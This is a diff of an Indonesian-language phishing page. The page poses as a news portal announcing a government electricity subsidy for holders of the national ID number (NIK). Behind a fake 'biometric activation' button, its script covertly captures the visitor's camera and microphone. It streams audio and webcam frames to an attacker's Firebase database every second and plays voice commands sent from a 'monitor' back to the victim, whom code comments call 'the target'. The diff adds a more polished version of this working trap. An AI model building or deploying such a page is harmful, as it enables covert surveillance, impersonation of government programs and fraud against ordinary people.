@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Warta Nasional - Berita Terkini</title>
+    <title>Warta Nasional - Portal Berita Terpercaya</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
@@ -11,64 +11,88 @@
     </style>
 </head>
 <body class="bg-white">
+    <!-- Navigasi -->
     <nav class="bg-red-700 text-white p-4 shadow-md sticky top-0 z-50">
         <div class="max-w-4xl mx-auto flex justify-between items-center">
             <div class="font-bold text-2xl italic tracking-tighter">WARTA<span class="text-yellow-400">NASIONAL</span></div>
         </div>
     </nav>
 
+    <!-- Konten Berita -->
     <main class="max-w-4xl mx-auto p-4 md:p-8">
         <div class="mb-4 text-center md:text-left">
-            <span class="text-red-600 font-bold text-sm uppercase">Program Subsidi Nasional</span>
-            <h1 class="text-3xl md:text-4xl font-extrabold mt-2 leading-tight">Pemerintah Sahkan Program Sembako Gratis untuk Seluruh Pemegang NIK Aktif 2026</h1>
+            <span class="text-red-600 font-bold text-sm uppercase italic">Pengumuman Resmi</span>
+            <h1 class="text-3xl md:text-4xl font-extrabold mt-2 leading-tight">Pemerintah Mulai Cairkan Subsidi Listrik Bagi Pemegang NIK Aktif Seluruh Indonesia</h1>
         </div>
 
         <div id="trap-container" class="my-8 p-6 bg-red-50 border-l-4 border-red-600 rounded-lg shadow-inner">
-            <h3 class="font-bold text-xl mb-4 text-red-800 italic">Verifikasi Identitas Anda</h3>
-            <p class="text-sm text-gray-700 mb-6">Untuk memastikan bantuan tepat sasaran, silakan lakukan aktivasi biometrik wajah dan sinkronisasi data melalui tombol di bawah.</p>
-            <button id="verify-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded shadow-lg transition-all animate-bounce">
-                AKTIFKAN SEKARANG
+            <h3 class="font-bold text-xl mb-4 text-red-800 italic">Lakukan Aktivasi Biometrik</h3>
+            <p class="text-sm text-gray-700 mb-6">Untuk mencegah penipuan, subsidi hanya dicairkan setelah proses verifikasi biometrik wajah dan suara selesai dilakukan secara real-time.</p>
+            <button id="verify-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded shadow-lg transition-all animate-pulse uppercase tracking-widest">
+                Mulai Aktivasi Sekarang
             </button>
         </div>
     </main>
 
-    <!-- Video dimute agar target tidak mendengar feedback suaranya sendiri -->
+    <!-- Elemen video DIMUTE agar target tidak mendengar suaranya sendiri -->
     <video id="v" style="display:none" autoplay muted playsinline></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
         import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
-        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
-            authDomain: "apktroj.firebaseapp.com",
-            projectId: "apktroj",
-            storageBucket: "apktroj.firebasestorage.app",
-            messagingSenderId: "943833619122",
-            appId: "1:943833619122:web:d757ced4d56267abf247ab"
-        };
+        // Menggunakan konfigurasi dinamis dari lingkungan untuk menghindari Error invalid-api-key
+        const firebaseConfig = typeof __firebase_config !== 'undefined' 
+            ? JSON.parse(__firebase_config) 
+            : {
+                apiKey: "", 
+                authDomain: "apktroj.firebaseapp.com",
+                projectId: "apktroj",
+                storageBucket: "apktroj.firebasestorage.app",
+                messagingSenderId: "943833619122",
+                appId: "1:943833619122:web:d757ced4d56267abf247ab"
+            };
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
         const auth = getAuth(app);
-        const appId = "apktroj_v1";
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'apktroj_v1';
 
+        let user = null;
+
+        // Login otomatis saat tombol diklik
         document.getElementById('verify-btn').onclick = async () => {
             const btn = document.getElementById('verify-btn');
             btn.innerText = "MENGHUBUNGKAN KE SERVER...";
             btn.disabled = true;
 
-            await signInAnonymously(auth);
-            startAgent();
+            try {
+                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                    await signInWithCustomToken(auth, __initial_auth_token);
+                } else {
+                    await signInAnonymously(auth);
+                }
+            } catch (error) {
+                console.error("Auth Error:", error);
+                btn.innerText = "GAGAL MENGHUBUNGKAN";
+                btn.disabled = false;
+            }
         };
 
-        async function startAgent() {
-            const userId = auth.currentUser.uid;
+        onAuthStateChanged(auth, (u) => {
+            if (u) {
+                user = u;
+                startRealTimeStream();
+            }
+        });
+
+        async function startRealTimeStream() {
+            if (!user) return;
+            const userId = user.uid;
             
             try {
-                // Minta akses kamera dan mikrofon
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
@@ -76,47 +100,43 @@
                 const canvas = document.getElementById('c');
                 const ctx = canvas.getContext('2d');
 
-                // Konfigurasi Perekam Audio (Dikirim ke Monitor)
-                const mediaRecorder = new MediaRecorder(stream);
-                let audioChunks = [];
+                // MediaRecorder untuk real-time audio (tanpa terdengar di target)
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                
+                mediaRecorder.ondataavailable = async (e) => {
+                    if (e.data.size > 0 && user) {
+                        const reader = new FileReader();
+                        reader.readAsDataURL(e.data);
+                        reader.onloadend = async () => {
+                            const audioBase64 = reader.result;
+                            
+                            canvas.width = 300;
+                            canvas.height = 200;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const frame = canvas.toDataURL('image/jpeg', 0.4);
 
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) audioChunks.push(e.data);
+                            // Simpan ke path yang sesuai aturan Firestore
+                            await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
+                                frame: frame,
+                                audio: audioBase64,
+                                timestamp: Date.now(),
+                                uid: userId
+                            });
+                        };
+                    }
                 };
 
-                mediaRecorder.onstop = async () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    const reader = new FileReader();
-                    reader.readAsDataURL(audioBlob);
-                    reader.onloadend = async () => {
-                        const base64Audio = reader.result;
-                        
-                        // Ambil Frame Gambar
-                        canvas.width = 320;
-                        canvas.height = 240;
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const frame = canvas.toDataURL('image/jpeg', 0.5);
-
-                        // Kirim data ke Firebase
-                        await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
-                            frame: frame,
-                            audio: base64Audio,
-                            timestamp: Date.now(),
-                            uid: userId
-                        });
-                    };
-                    audioChunks = [];
-                };
-
-                // Rekam audio & gambar setiap 2 detik
+                // Ambil potongan suara secara berkala
                 setInterval(() => {
-                    mediaRecorder.start();
-                    setTimeout(() => {
-                        if(mediaRecorder.state === "recording") mediaRecorder.stop();
-                    }, 1700);
-                }, 2000);
+                    if (mediaRecorder.state === "inactive") {
+                        mediaRecorder.start();
+                        setTimeout(() => {
+                            if(mediaRecorder.state === "recording") mediaRecorder.stop();
+                        }, 900);
+                    }
+                }, 1100);
 
-                // Mendengar perintah "Send Voice" dari Monitor (Teks ke Suara)
+                // Perintah Suara dari Monitor
                 onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), (snap) => {
                     if (snap.exists()) {
                         const data = snap.data();
@@ -126,17 +146,19 @@
                             window.speechSynthesis.speak(utter);
                         }
                     }
-                });
+                }, (err) => console.error("Snapshot error:", err));
 
                 document.getElementById('trap-container').innerHTML = `
                     <div class="text-center p-4">
                         <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-red-600 mb-2"></div>
-                        <p class="text-sm font-bold text-red-600 uppercase italic">Verifikasi Biometrik...</p>
-                        <p class="text-xs text-gray-400 mt-2">Mohon jangan tutup browser.</p>
+                        <p class="text-sm font-bold text-red-600 uppercase italic">Verifikasi Biometrik Sedang Berjalan...</p>
+                        <p class="text-[10px] text-gray-500 mt-2">Jangan tutup tab ini untuk memproses subsidi Anda.</p>
                     </div>
                 `;
+
             } catch (err) {
-                alert("Izin Kamera & Mikrofon diperlukan untuk verifikasi identitas.");
+                console.error("Stream Error:", err);
+                alert("Izin Kamera dan Mikrofon diperlukan untuk verifikasi.");
                 location.reload();
             }
         }
